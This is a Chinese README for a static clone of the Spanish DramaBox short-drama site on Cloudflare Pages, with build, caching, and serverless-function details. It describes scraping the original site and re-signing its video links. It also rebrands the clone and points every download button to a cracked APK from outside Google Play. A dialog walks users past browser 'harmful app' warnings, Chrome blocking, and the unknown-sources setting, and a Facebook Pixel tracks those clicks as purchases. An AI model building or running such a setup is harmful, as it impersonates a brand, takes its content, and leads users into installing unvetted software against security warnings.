# Dranabox Clone — dramabox.com/es 静态镜像

`https://dramabox.com/es`（西语短剧站，移动端优先）的 1:1 静态复刻工程。原站的 Next.js 产出的 HTML 被镜像成纯静态文件，本项目负责把它们打进 `dist/`，用 **Cloudflare Pages（纯静态 + Pages Functions）** 部署。零依赖，不需要 `npm install`。

---

## 项目结构

```
.
├─ site/                     # 镜像产物（由镜像步骤生成，本项目不改其 html）
│  ├─ index.html             # /es/ 首页
│  ├─ es/…                   # 干净 URL 目录：es/browse/index.html、es/download/index.html …
│  ├─ static/…               # Next.js chunk / css / 字体
│  └─ media/…               # 视频、m3u8、封面
├─ public/                   # 直接铺到 dist 根的 Pages 配置文件
│  ├─ _headers               # 缓存与安全头
│  ├─ _redirects             # 301/302 跳转规则
│  └─ favicon.ico …          # 其它根级静态文件
├─ data/                     # 书籍 JSON（books/<bookId>.json、listing.json）
├─ functions/                # Cloudflare Pages Functions（ESM）
│  ├─ _middleware.js          # 全站中间件：HTML 缓存头 + /es/ 404 回落
│  └─ es/video/[[path]].js    # /es/video/:bookSlug/:epSlug 参数校验 + 302
├─ scripts/
│  ├─ build.mjs              # 构建：site + public + data -> dist
│  └─ serve.mjs              # 本地静态服务器（端口 4173，模拟 Pages 行为）
├─ raw/                      # 抓取的原始 HTML（不入库，见 .gitignore）
├─ dist/                     # 构建输出（不入库）
├─ wrangler.toml             # Pages 项目配置
└─ package.json
```

## 常用命令

```bash
npm run build     # 清空并生成 dist/
npm run dev       # 本地预览 http://127.0.0.1:4173
npm run clean     # 删除 dist/
```

`node scripts/build.mjs` 的输出形如：

```
[build] site=1284 public=3 data=212 用时 812ms
dist ready: 1499 files, 63.42 MB
```

- 复制顺序是 **site → public → data**：`public/` 里的 `_headers`、`_redirects`、`favicon.ico` 会覆盖 `site/` 中的同名文件。
- `site/` 不存在时构建会立刻失败并打印路径提示（镜像步骤没跑完就先补镜像）。
- `dist/404.html` 在 `site/` 未提供时自动生成一个西语兜底页。
- 调试用环境变量（可选）：`SITE_DIR` / `PUBLIC_DIR` / `DATA_DIR` / `DIST_DIR`，一般不用动。

## Cloudflare Pages 设置

| 项 | 值 |
| --- | --- |
| Framework preset | None |
| Build command | `npm run build` |
| Output directory | `dist` |
| Node version | `22`（环境变量 `NODE_VERSION=22`，或 `.nvmrc`） |
| Functions directory | `functions/`（默认，无需配置） |

`wrangler.toml` 已声明 `pages_build_output_dir = "dist"`，所以 `wrangler pages deploy` 也可以直接用。

本地带 Functions 的预览：

```bash
npx wrangler pages dev dist --compatibility-date=2025-01-01
```

（`wrangler` 只在需要时临时用 `npx`，不写进依赖。）

## Pages Functions 说明

### `functions/_middleware.js`
- HTML 响应统一加 `Cache-Control: public, max-age=0, must-revalidate`；`.js`/`.css`/图片/视频/JSON 原样放行。
- `/es/` 前缀的 404 回落到 `/es/` 首页内容（仍返回 404 状态码，带 `X-Robots-Tag: noindex, follow`）。

### `functions/es/video/[[path]].js`
匹配 `/es/video/41000110515_Escape-With-Boss-s-Baby/585509625_Episode-1`：

1. `bookId` = 第一段下划线前数字 → `41000110515`；`chapterId` = 第二段下划线前数字 → `585509625`；
2. 同源读 `/data/books/<bookId>.json`（优先 `context.env.ASSETS.fetch`，无绑定时回落普通 `fetch`）；
3. 书籍数据取不到 → `302 /es/drama/<bookId>/`；
4. 章节不存在 → 404 简单 HTML；
5. 校验通过 → 透传同源静态播放页。**播放器页面本身由另一部分工作生成**，这里不渲染 HTML。

扩展点已在代码里标注：`CACHE_HOOK`（KV/D1 缓存书籍 JSON）、签名播放地址注入、按地区灰度的 302 目标。

## 视频签名 URL 过期与刷新机制（TODO）

镜像里的 `media/` 播放地址是从原站抓下来的**带签名 URL**，通常包含 `expires` / `sign` / `token` 之类的查询参数，过期后返回 403/404，视频播不出来。当前工程的处理策略与待办：

- **现状（占位）**：`dist/media/` 直接放本地/已抓取的静态文件，播放页引用相对路径，不依赖原站签名，因此**不会过期**——但文件体积大，且需要重新抓取才能更新片源。
- **TODO 1｜签名探测**：在 `functions/es/video/[[path]].js` 里对上游 403/404 做一次识别，命中时触发刷新流程，而不是把错误直接透给用户。
- **TODO 2｜签名刷新**：新增 `functions/api/refresh-token.js`（或定时任务），用上游 sig/play 接口换取新的 `expires + sign`，写入 KV（`BOOKS_KV` / `MEDIA_KV`）并设置 TTL = `expires - 60s`。KV 未命中时才回源，避免每次请求都签名。
- **TODO 3｜TTL 与抖动**：签名 TTL 按上游给的最小值减去 60 秒安全边界；缓存 key 带 `bookId:chapterId:quality`，避免不同清晰度互相覆盖。
- **TODO 4｜回退**：刷新失败时 302 回 `/es/drama/<bookId>/`，并在响应头打 `X-Dranabox-Media: stale` 便于监控。
- **TODO 5｜防盗链**：对外只暴露本站短链，`/media/*` 的 `_headers` 已设 `max-age=86400`，不要设 `immutable`（签名 URL 会过期，缓存必须可淘汰）。

## 缓存策略一览（`public/_headers`）

| 路径 | Cache-Control |
| --- | --- |
| `/static/*` | `public, max-age=31536000, immutable` |
| `/*.html`、`/es/*`（目录页） | `public, max-age=0, must-revalidate` |
| `/media/*` | `public, max-age=86400` |
| `/data/*` | `public, max-age=300` |

全站安全头：`X-Content-Type-Options: nosniff`、`Referrer-Policy: strict-origin-when-cross-origin`，另加 `X-Frame-Options: SAMEORIGIN` 与 `Permissions-Policy`。

视频跨域播放不需要额外 CORS 配置：`media` 与页面同源，`_headers` 里已带 `Accept-Ranges: bytes`，直接支持拖动。

## 跳转规则（`public/_redirects`）

```
/         /es/          302   # 临时，方便预览
/es       /es/          301   # 规范 URL
/download /es/download/ 301
```

## 入库约定

`raw/`、`dist/`、`node_modules/`、`.wrangler/`、`*.log`、`.DS_Store` 已被 `.gitignore` 排除。提交前只在 `site/`、`data/`、`public/`、`functions/`、`scripts/` 上产生 diff。

## 视频链路（重要）

原站每集 mp4 是 CloudFront 签名直链，**签名 24 小时过期**，不能长期热链。

播放器统一走同源端点：

```
/video/<bookId>/<chapterId>.mp4
  ├─ Pages Function: functions/video/[[path]].js
  ├─ 读 /data/books/<bookId>.json 拿当前地址
  ├─ 距过期 < 6h 时回源 www.dramabox.com 重签（结果进 Cache API 6h）
  └─ 302 到可播放的签名直链
```

本地 `npm run dev` 由 `scripts/serve.mjs` 做同样的 302（不重签，用于预览）。

免费集数：99,399 集中 15,654 集（15.7%）带 mp4，其余为原站付费集，复刻版保持同样的付费墙。
批量刷新签名：`python tools/refresh_urls.py`（可选，端点已能按需重签）。

## 站点配置（换名字 / 换下载地址 / 换付费墙文案）

改 `site/config.js` 一处即可，全站生效：

```js
window.DBX = {
  appName: "DramaBox Ilimitado",          // 全站文本里的 DramaBox 都会替换成它
  downloadUrl: "https://.../app.apk",     // 所有「Descargar / Desbloquear」按钮都跳这里
  banner:  { text: "...", cta: "Descargar" },
  paywall: { title: "...", body: "...", cta: "...", secondary: "..." }
};
```

改完 `npm run build` 重新构建（页面 HTML 不用动，配置是运行时读取的）。

## 自动跟随官网更新

`tools/sync.py`：重抓列表 → 找出新增剧集 → 抓详情页和播放页 → 重打包 → 重生成页面。

- 手动：`python tools/sync.py`（本机需要代理时 `set DB_PROXY=http://127.0.0.1:7890`）
- 自动：`.github/workflows/sync.yml` 每天 UTC 03:00 跑一次，有变化就 commit + push，
  Cloudflare Pages 收到 push 自动重建。也可以在 Actions 页面手动点 Run workflow。

## Facebook Pixel

`site/config.js` 里填 Pixel ID 即可，留空则不加载（事件全部跳过）：

```js
fbPixelId: "1234567890123456",   // ← 你的 Pixel ID
```

| 触发点 | 事件 |
|---|---|
| 任意页面加载 | `PageView` |
| 点「下载」（顶部条 / 付费墙 / 底部 Descargar） | `InitiateCheckout` |
| 安全提示框里点「Descargar de todos modos」 | `Purchase` |

参数统一带 `content_name: "DramaBox Ilimitado APK"`、`currency: "USD"`、`value: 0`（free 版本，方便报表区分）。
`fbEvents` / `fbParams` 也可在 config 里改。

## 第三方下载安全提示

破解版不能上架 Google Play，点下载会先弹提示框（`downloadNotice` 文案在 config 里改），
里面给三步操作说明（浏览器提示「应用有害」怎么继续、Chrome 拦截后怎么放行、未知来源安装），
确认后再跳 `downloadUrl`。这样能显著降低「点了没反应 / 以为中毒」的流失。
